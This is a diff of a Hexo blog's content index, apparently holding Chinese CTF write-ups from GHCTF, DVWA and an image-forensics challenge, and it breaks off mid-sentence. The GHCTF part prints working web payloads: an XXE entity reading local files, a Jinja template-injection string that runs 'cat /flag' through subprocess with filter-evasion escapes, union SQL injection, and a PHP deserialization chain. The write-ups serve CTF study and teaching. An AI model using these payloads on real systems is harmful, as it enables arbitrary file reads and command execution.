-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">split_known_iend</span>(<span class="params">file_path, iend_pos</span>):</span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    end_pos = iend_pos + <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割数据</span></span><br><span class="line">    png_data = data[:end_pos]</span><br><span class="line">    extra_data = data[end_pos:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> png_data, extra_data</span><br><span class="line">png_part, extra_part = split_known_iend(<span class="string">&quot;C:\\tools\\bkcrack-1.7.1-win64\\3.png&quot;</span>, <span class="number">0x107b29</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clean.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_part)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extra_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extra_part)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>，得到一个字符串<code>TlNTQ1RGe0knbV9XaDFzcDNyaU5nX091Ul9MdTExYWJZX2Ywcl9ZMHVfdG9fQ29NZV9CNGNrX0hvbWV9</code></p>
-<p>base64解码得到</p>
-<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{I’m_Wh1sp3riNg_OuR_Lu11abY_f0r_Y0u_to_CoMe_B4ck_Home}</p>
-]]></content>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA</title>
     <url>/2025/02/24/DVWA/</url>
     <content><![CDATA[<h1 id="Brute-Force-暴力"><a href="#Brute-Force-暴力" class="headerlink" title="Brute Force(暴力)"></a>Brute Force(暴力)</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>虽然题目叫暴力破解，但是这里还可以用sql注入。</p>
@@ -215,6 +122,117 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2024/08/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>GHCTFwp</title>
+    <url>/2025/03/01/GHCTFwp/</url>
+    <content><![CDATA[<h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><p>战队名：先辈の队</p>
+<p>比赛排名：4</p>
+<p>联系方式:3011366557</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p>看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import base64</span><br><span class="line">from lxml import etree</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 创建一个Flask应用实例</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当访问网站根目录时触发</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    # 打开当前Python文件并读取内容，然后返回给客户端</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"># 定义一个路由，当以POST方法访问/ghctf路径时触发</span><br><span class="line">@app.route(&#x27;/ghctf&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def parse():</span><br><span class="line">    # 从POST请求的表单中获取名为&#x27;xml&#x27;的字段</span><br><span class="line">    xml = request.form.get(&#x27;xml&#x27;)</span><br><span class="line">    # 打印获取到的xml内容</span><br><span class="line">    print(xml)</span><br><span class="line">    </span><br><span class="line">    # 如果没有提供&#x27;xml&#x27;字段，返回&quot;No System is Safe.&quot;</span><br><span class="line">    if xml is None:</span><br><span class="line">        return &quot;No System is Safe.&quot;</span><br><span class="line">    </span><br><span class="line">    # 创建一个lxml的XML解析器，允许加载DTD和解析实体</span><br><span class="line">    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)</span><br><span class="line">    </span><br><span class="line">    # 使用解析器解析xml字符串，获取XML的根元素</span><br><span class="line">    root = etree.fromstring(xml, parser)</span><br><span class="line">    </span><br><span class="line">    # 从XML中查找&#x27;name&#x27;标签，并获取其文本内容</span><br><span class="line">    name = root.find(&#x27;name&#x27;).text</span><br><span class="line">    </span><br><span class="line">    # 返回&#x27;name&#x27;标签的文本内容，如果没有找到则返回None</span><br><span class="line">    return name or None</span><br><span class="line"></span><br><span class="line"># 当这个脚本作为主程序运行时</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 在所有网络接口上运行应用，端口为8080</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p>看到 <strong>parser &#x3D; etree.XMLParser(load_dtd&#x3D;True, resolve_entities&#x3D;True)</strong></p>
+<p>我们可以利用XXE攻击，即XML外部实体攻击。</p>
+<p>首先我们要抓包将其改为POST方法，并访问&#x2F;ghctf，页面上显示<code>No System is Safe.</code></p>
+<p>由于文件允许加载DTD和解析实体，我们xml字段中的内容可以写为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code></p>
+<p>定义了一个名为xxe的实体并且其值是本地文件中flag文件的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在根目录的name标签中引用xxe。</p>
+<p>由于Content-Type<code>是</code>application&#x2F;x-www-form-urlencoded所以我们要把这个xml文本用url编码并复制到请求体的xml字段中再发送便能得到</p>
+<h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{7e4db57a-3ded-4ff4-972f-9873e2168114}</p>
+<h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p>查看附件app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def view_file(filename):</span><br><span class="line">    try:</span><br><span class="line">        # 1. 过滤文件名</span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        if not safe_filename:</span><br><span class="line">            abort(400, description=&quot;无效文件名&quot;)</span><br><span class="line"></span><br><span class="line">        # 2. 构造完整路径</span><br><span class="line">        file_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], safe_filename)</span><br><span class="line"></span><br><span class="line">        # 3. 路径安全检查</span><br><span class="line">        if not is_safe_path(app.config[&#x27;UPLOAD_FOLDER&#x27;], file_path):</span><br><span class="line">            abort(403, description=&quot;禁止访问的路径&quot;)</span><br><span class="line"></span><br><span class="line">        # 4. 检查文件是否存在</span><br><span class="line">        if not os.path.isfile(file_path):</span><br><span class="line">            abort(404, description=&quot;文件不存在&quot;)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[1]</span><br><span class="line">        print(suffix)</span><br><span class="line">        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:</span><br><span class="line">            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#x27;image/jpeg&#x27;)</span><br><span class="line"></span><br><span class="line">        if contains_dangerous_keywords(file_path):</span><br><span class="line">            # 删除不安全的文件</span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400</span><br><span class="line"></span><br><span class="line">        with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">            file_data = f.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">            &lt;title&gt;查看文件内容&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span><br><span class="line">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span><br><span class="line">            &lt;/footer&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        return render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        app.logger.error(f&quot;文件查看失败: &#123;str(e)&#125;&quot;)</span><br><span class="line">        abort(500, description=&quot;文件查看失败:&#123;&#125; &quot;.format(str(e)))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现<code>render_template_string(tmp_str)</code>这个函数能渲染html模板，模板中有我们上传文件中的内容，那么我们可以想到在我们上传的文件中写入一些危险代码随后再进行访问来显示flag。</p>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>我们首先在文件中写入49发现访问文件后回显的是49，说明存在模板注入。</p>
+<p>接着我们就可以开始构造我们的攻击代码，基本的代码是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__bases__[0].__subclasses__()[370](&quot;cat /flag&quot;, shell=True, stdout=-1).communicate() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中__subclasses__()[370]是类&lt;class ‘subprocess.Popen’&gt;</p>
+<p>但是由于过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dangerous_keywords = [&#x27;_&#x27;, &#x27;os&#x27;, &#x27;subclasses&#x27;, &#x27;__builtins__&#x27;, &#x27;__globals__&#x27;,&#x27;flag&#x27;,]</span><br></pre></td></tr></table></figure>
+
+<p>我们需要把_换成16进制的\x5f,把subclasses拆分成两个字符串，那么便可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; []|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbases\x5f\x5f&quot;)|first|attr(&quot;\x5f\x5fsubcla&quot;+&quot;sses\x5f\x5f&quot;)()|list|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(370)|attr(&quot;\x5f\x5fcall\x5f\x5f&quot;)(&quot;cat /fl\x61g&quot;, shell=True, stdout=-1)|attr(&quot;communicate&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里|attr可以避免使用<code>.</code></p>
+<p><code>\x5f</code>绕过_,<code>fl\x61g</code>绕过flag，利用 <code>communicate()</code> 方法来执行命令并获取输出。上传并访问便能得到</p>
+<h3 id="flag：-1"><a href="#flag：-1" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{f9359d63-c8f5-4f3a-ae52-d164bbc158c6}</p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p>先使用联合查询判断显示位</p>
+<p><code>?id=0 union select 1,2,3,4,5</code></p>
+<p><img src="/../images/1740890606674.jpg" alt="1740890606674" loading="lazy"></p>
+<p>但是不知道数据库是哪种，于是我问ai各种数据库查询版本的代码最后查出是sqlite</p>
+<p><img src="/../images/1740890718774.jpg" alt="1740890718774" loading="lazy"></p>
+<p>随后直接查询flag</p>
+<p><img src="/../images/1740890779787.jpg" alt="1740890779787" loading="lazy"></p>
+<p>成功。</p>
+<h2 id="POppppppp"><a href="#POppppppp" class="headerlink" title="POppppppp"></a>POppppppp</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据源码发现这题是反序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>我们主要是要利用mystery类中的原生类来读取flag文件，构造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CherryBlossom &#123;</span><br><span class="line">    public $fruit1;</span><br><span class="line">    public $fruit2;</span><br><span class="line">    public function __construct($a) &#123;</span><br><span class="line">        $this-&gt;fruit1 = $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Samurai &#123;</span><br><span class="line">    public $fruit6;</span><br><span class="line">    public $fruit7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Warlord &#123;</span><br><span class="line">    public $fruit4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Philosopher &#123;</span><br><span class="line">    public $fruit10;</span><br><span class="line">    public $fruit11;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mystery &#123;</span><br><span class="line">    public $SplFileObject;</span><br><span class="line">&#125;</span><br><span class="line">$mystery = new Mystery();</span><br><span class="line">$mystery-&gt;SplFileObject= &quot;/flag44545615441084&quot;;</span><br><span class="line">$philosopher = new Philosopher();</span><br><span class="line">$philosopher-&gt;fruit10 = $mystery;</span><br><span class="line">$philosopher-&gt;fruit11 = 213; </span><br><span class="line">$warlord = new Warlord();</span><br><span class="line">$warlord-&gt;fruit4 = $philosopher;</span><br><span class="line">$samurai = new Samurai();</span><br><span class="line">$samurai-&gt;fruit6 = $warlord;</span><br><span class="line">$samurai-&gt;fruit7 = $mystery;</span><br><span class="line">$cherry = new CherryBlossom($samurai);</span><br><span class="line">echo urlencode(serialize($cherry));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个难点，其中就是如何触发mystery中的get方法，我们可以想到利用Philosopher中的$this-&gt;fruit10-&gt;hey;，那么我们就需要一个字符串能两次md5后有666，因为这个是“&#x3D;&#x3D;”弱比较所以只要有包含666的字符串就行了，扔给ai生成脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;666&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000000</span>):</span><br><span class="line">    input_str = <span class="built_in">str</span>(i)</span><br><span class="line">    temp = hashlib.md5(input_str.encode()).hexdigest()</span><br><span class="line">    final = hashlib.md5(temp.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> final.startswith(target):  <span class="comment"># 检查前缀是否为 &quot;666&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: input=<span class="subst">&#123;input_str&#125;</span>, final_md5=<span class="subst">&#123;final&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>运行得到结果“213”，我们将$fruit11赋值为213便能触发mystery的get方法，接下来便是寻找原生类的运用，搜索发现我们可以分别利用GlobIterator 类读取目录和SplFileObject类读取文件，我们只要将mystery设置一个新属性属性名为我们要用的类，值是我们的路径，便可以先通过GlobIterator 类找到flag的名字在用SplFileObject读取flag文件就行了。</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{e92e6ae9-2fd8-49cf-b5d2-8072e4f0862b} </p>
+<h2 id="upupup"><a href="#upupup" class="headerlink" title="upupup"></a>upupup</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据提示不影响 .htaccess 语法的 mine绕过（getimagesize&amp;exif_imagetype绕过），我们可以在网上搜到文章<a href="https://blog.csdn.net/qq_45570082/article/details/108910162">php 文件上传.htaccess getimagesize和exif_imagetype绕过_getimagesize图片类型绕过-CSDN博客</a>，发现我们只要将.htaccess的内容设置为</p>
